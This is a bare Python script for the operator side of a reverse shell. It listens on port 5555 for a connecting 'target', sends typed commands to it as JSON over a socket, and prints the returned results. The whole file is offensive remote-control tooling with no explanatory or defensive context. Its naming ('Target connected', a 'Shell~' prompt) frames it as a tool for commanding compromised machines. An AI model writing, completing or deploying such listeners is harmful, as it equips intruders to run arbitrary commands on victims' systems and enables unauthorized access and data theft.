import json
import socket

def send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def recieve():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def target_communication():
    while True:
        command = input('* Shell~%s: ' % str(ip))
        send(command)
        if command == "quit":
            break
        result = recieve()
        print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("127.0.0.1", 5555))
print("Listening for incoming connections")
sock.listen(5)
target, ip = sock.accept()
print("[+] Target connected from: ", str(ip))

target_communication()

